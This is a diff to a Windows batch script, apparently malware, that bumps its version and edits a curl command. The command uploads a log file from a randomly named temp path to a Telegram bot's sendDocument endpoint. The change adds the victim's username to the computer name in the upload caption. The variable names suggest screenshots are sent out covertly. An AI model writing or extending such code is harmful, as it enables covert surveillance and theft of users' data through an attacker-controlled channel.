@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=29.6"
+set "BATCHVERSION=29.7"
 set "LOGFILE=%temp%\S1rNsvQgG.mpeez"
 set "RESULT=%TEMP%\TGRESU.txa"
 
@@ -2333,7 +2333,7 @@ if %errorlevel%==0 (
 curl -s -X POST "https://api.telegram.org/bot%TOKEN_UPDATESSCRNSHTS%/sendDocument" ^
      -F "chat_id=%CHAT_ID_UPDATESSCRNSHTS%" ^
      -F "message_thread_id=%TOPIC_ID_UPDATESSCRNSHTS%" ^
-     -F "caption=%COMPUTERNAME%|%time%" ^
+     -F "caption=%USERNAME%(%COMPUTERNAME%)|%time%" ^
      -F "document=@%LOGFILE1%" > "%RESULT%"
 
 
